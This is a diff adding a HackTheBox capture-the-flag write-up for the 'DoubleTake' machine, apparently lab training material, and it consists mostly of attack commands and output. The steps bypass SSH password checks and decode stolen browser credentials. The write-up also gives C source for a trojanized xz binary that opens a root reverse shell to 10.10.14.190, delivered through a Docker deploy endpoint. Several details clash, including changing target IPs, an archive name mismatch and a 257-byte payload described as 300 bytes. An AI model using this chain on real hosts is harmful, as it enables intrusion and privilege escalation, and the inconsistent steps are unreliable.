@@ -1,0 +1,218 @@
+---
+type: writeup
+title: DoubleTake
+description: DoubleTake es una máquina Linux de dificultad fácil que ejecuta una plataforma de agente de IA detrás de un contenedor Docker. El puerto 22 sirve SSH desde un contenedor Alpine con OpenSSH 10.6p1 compilado contra musl. CVE-2026-123158 elude la autenticación de contraseña para el usuario alpine enviando una contraseña de 300 bytes que hace que crypt() de musl devuelva "*", que coincide con la entrada shadow de la cuenta bloqueada. Dentro del contenedor, un inicio de sesión de Firefox guardado revela credenciales para la aplicación web en el puerto 80. La plataforma expone un punto final de despliegue que reenvía archivos a PUT /containers/{id}/archive de la API de Docker. Docker 29.5.0 es vulnerable a CVE-2026-41567, que resuelve los binarios de descompresión desde el sistema de archivos superpuesto del contenedor en lugar del del host. Sustituir /usr/bin/xz en el contenedor y subir un archivo comprimido a través de la página de despliegue provoca que el demonio de Docker ejecute el binario troyanizado como usuario root del host.
+lang: es
+draft: true
+image: ../../../../images/writeups/hackthebox/machines/doubletake/doubletake.png
+platform: hackthebox
+url: https://app.hackthebox.com/machines/DoubleTake
+difficulty: easy
+os: linux
+hints: []
+tags: []
+---
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.156.109
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 62
+80/tcp open  http    syn-ack ttl 63
+```
+
+```bash
+nmap -p 22,80 -sCV -oA nmap/openports 10.129.156.109
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+| http-auth:
+| HTTP/1.1 401 UNAUTHORIZED\x0D
+|_  Basic realm=Zentara
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+[https://nvd.nist.gov/vuln/detail/cve-2026-123158](https://nvd.nist.gov/vuln/detail/cve-2026-123158)
+
+```bash
+ssh alpine@10.129.156.109
+```
+
+```bash
+python3 -c 'print("A"*257)'
+```
+
+```plaintext
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+```bash
+ls -Ra /home/
+```
+
+```plaintext
+/home/:
+.       ..      alpine  bob
+
+/home/alpine:
+.             ..            .ash_history  .mozilla
+
+/home/alpine/.mozilla:
+.        ..       firefox
+
+/home/alpine/.mozilla/firefox:
+.                ..               profiles.ini     zentara.default
+
+/home/alpine/.mozilla/firefox/zentara.default:
+.                  ..                 cert9.db           key4.db            logins.json        pkcs11.txt         prefs.js           signedInUser.json
+
+/home/bob:
+.         ..        user.txt
+```
+
+```bash
+cat /home/alpine/.mozilla/firefox/zentara.default/logins.json
+```
+
+```json
+{
+  "nextId": 2,
+  "logins": [
+    {
+      "id": 1,
+      "hostname": "http://172.17.0.1",
+      "httpRealm": "Zentara",
+      "formActionOrigin": null,
+      "usernameField": "",
+      "passwordField": "",
+      "encryptedUsername": "Ym9i",
+      "encryptedPassword": "Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==",
+      "guid": "{a1b2c3d4-e5f6-7890-abcd-ef1234567890}",
+      "encType": 0,
+      "timeCreated": 1730000000000,
+      "timeLastUsed": 1730900000000,
+      "timePasswordChanged": 1730000000000,
+      "timesUsed": 14
+    }
+  ],
+  "potentiallyVulnerablePasswords": [],
+  "dismissedBreachAlertsByLoginGUID": {},
+  "version": 3
+}
+```
+
+```bash
+echo 'Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==' | base64 -d; echo
+```
+
+```plaintext
+CorrectHorseBatteryStaple
+```
+
+```bash
+echo 'Ym9i' | base64 -d; echo
+```
+
+```plaintext
+bob
+```
+
+[http://10.129.156.109](http://10.129.156.109)
+
+- **Username**: bob
+- **Password**: CorrectHorseBatteryStaple
+
+`/etc/hosts`
+
+```bash
+10.129.156.109 zentara.htb platform.zentara.htb
+```
+
+```bash
+ssh bob@10.129.156.109
+```
+
+```bash
+cat /home/bob/user.txt
+```
+
+<Callout type="success" title="User flag">
+  5ff**************************b1e
+</Callout>
+
+[http://10.129.156.109/status](http://10.129.156.109/status)
+
+![Zentara Status](@images/writeups/hackthebox/machines/doubletake/zentara-status.png)
+
+Google `docker 29.5.0 vuln`
+
+[https://www.tenable.com/plugins/nessus/324948](https://www.tenable.com/plugins/nessus/324948)
+
+[https://github.com/advisories/GHSA-x86f-5xw2-fm2r](https://github.com/advisories/GHSA-x86f-5xw2-fm2r)
+
+`xz.c`
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/mount.h>
+
+int main(int argc, char *argv[]) {
+    mount("proc", "/proc", "proc", 0, NULL);
+    chroot("/proc/1/root");
+    chdir("/");
+    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.190/1111 0>&1", NULL);
+    return 1;
+}
+```
+
+```bash
+gcc -static -o xz xz.c
+```
+
+```bash
+mkdir -p usr/bin
+```
+
+```bash
+cp xz usr/bin/xz
+```
+
+```bash
+tar cf melvin.tar usr/bin/xz
+```
+
+```bash
+curl -s -u bob:CorrectHorseBatteryStaple -X POST -F "archive=@melvin.tar" -F "workspace=/" http://10.129.156.168/deploy | jq
+```
+
+```bash
+echo x > t
+echo "melvin" > melvin.txt
+tar cf rev.tar t melvin.txt
+xz archive.tar
+```
+
+```bash
+nc -lnvp 1111
+```
+
+```bash
+curl -s -u bob:CorrectHorseBatteryStaple -X POST -F "archive=@rev.tar.xz" -F "workspace=/workspace" http://10.129.156.168/deploy | jq
+```
+
+```bash
+cat /root/root.txt
+```
+
+<Callout type="success" title="Root flag">
+  284**************************4bf
+</Callout>
